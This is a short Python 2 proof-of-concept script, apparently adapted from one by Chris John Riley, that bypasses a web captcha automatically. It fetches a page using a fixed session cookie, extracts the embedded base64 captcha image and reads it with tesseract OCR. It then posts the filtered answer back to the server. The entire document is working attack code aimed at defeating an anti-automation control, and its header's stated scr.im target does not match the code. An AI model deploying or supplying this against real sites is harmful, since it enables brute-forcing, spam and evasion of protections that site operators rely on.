#!/usr/bin/python

# [PoC] tesseract OCR script - tuned for scr.im captcha
#
# Chris John Riley
# blog.c22.cc
# contact [AT] c22 [DOT] cc
# 12/10/2010
# Version: 1.0
#
# Changelog
# 0.1> Initial version taken from Andreas Riancho's \
#      example script (bonsai-sec.com)
# 1.0> Altered to use Python-tesseract, tuned image \
#      manipulation for scr.im specific captchas
#

from PIL import Image
import tesseract
import cv2.cv as cv
import httplib, urllib
import base64
url=""
user="admin"
host=""
cookie="PHPSESSID=1pl8ah7"


conn = httplib.HTTPConnection(host)
headers = {"Cookie" : cookie,'Content-Type':'application/x-www-form-urlencoded' }


conn.request("GET","%s" %(url), None, headers)
response = conn.getresponse()
data = response.read()

conn.close()

ptr=data.find("base64,")+7
ptr2=data.find("\" /><br><br><form action")

img=data[ptr:ptr2]
f = open ("test.png", "w")
f.write(base64.b64decode(img))
f.close()


image=cv.LoadImage("test.png", cv.CV_LOAD_IMAGE_GRAYSCALE)
api = tesseract.TessBaseAPI()
api.Init(".","eng",tesseract.OEM_DEFAULT)
api.SetPageSegMode(tesseract.PSM_AUTO)

tesseract.SetCvImage(image,api)
text=api.GetUTF8Text()
conf=api.MeanTextConf()
charset="abcdefghjklmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
soluce=""
for i in text:
    if charset.find(i)!=-1:
        soluce=soluce+i
print text + " - " + soluce


conn = httplib.HTTPConnection(host)
headers = {"Cookie" : cookie,'Content-Type':'application/x-www-form-urlencoded' }
param=urllib.urlencode({'cametu':soluce})
conn.request("POST","%s" %(url), param, headers)
response = conn.getresponse()
data = response.read()

conn.close()
print data

